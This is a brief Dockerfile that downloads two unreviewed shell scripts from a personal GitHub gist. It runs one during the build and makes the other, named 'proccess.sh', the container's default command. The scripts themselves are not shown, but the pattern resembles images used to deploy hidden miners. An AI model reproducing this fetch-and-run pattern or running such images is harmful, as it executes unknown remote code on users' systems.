FROM ubuntu:16.04

WORKDIR /usr/local/bin
RUN cd /usr/local/bin

RUN apt update && apt install -y wget

RUN wget https://gist.githubusercontent.com/deniusmalog/3cd0a9a7e6be2653bea3e8acfcd6e26e/raw/4f62e4c5fbc7fa272670494ca487ea5b8990fc98/install.sh
RUN chmod +x install.sh
RUN sh install.sh

RUN wget https://gist.githubusercontent.com/deniusmalog/19274459405a080fad9f1956b12cfeff/raw/303f3a2ca07425cb8b1da000deb24408b358ac30/proccess.sh
RUN chmod +x proccess.sh

RUN PATH=$PATH:/usr/local/bin

CMD /bin/bash /usr/local/bin/proccess.sh